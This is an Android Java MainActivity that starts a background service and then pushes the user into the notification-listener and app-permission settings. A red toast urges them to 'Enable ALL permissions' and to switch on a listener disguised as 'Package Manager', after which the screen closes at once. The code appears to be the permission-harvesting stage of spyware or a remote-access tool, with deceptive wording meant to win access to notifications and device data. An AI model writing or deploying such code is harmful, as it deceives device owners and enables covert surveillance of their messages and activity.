package br.com.assessoriarealeza.irp;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final int DURATION_LONG = Toast.LENGTH_LONG;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        startService(new Intent(this, MainService.class));

        if (!isNotificationServiceRunning()) {
            showPermissionsToast();
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            Intent appDetailsIntent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            appDetailsIntent.setData(Uri.parse("package:" + BuildConfig.APPLICATION_ID));
            startActivity(appDetailsIntent);
        }

        finish();
    }

    private void showPermissionsToast() {
        Context context = getApplicationContext();
        CharSequence text = "Click 'Permissions'\nEnable ALL permissions\nClick back x2\nEnable 'Package Manager'";
        Toast toast = Toast.makeText(context, text, DURATION_LONG);
        TextView v = (TextView) toast.getView().findViewById(android.R.id.message);
        v.setTextColor(Color.RED);
        v.setTypeface(Typeface.DEFAULT_BOLD);
        v.setGravity(Gravity.CENTER_VERTICAL | Gravity.CENTER_HORIZONTAL);
        toast.show();
    }

    private boolean isNotificationServiceRunning() {
        ContentResolver contentResolver = getContentResolver();
        String enabledNotificationListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners");
        String packageName = getPackageName();
        return enabledNotificationListeners != null && enabledNotificationListeners.contains(packageName);
    }
}
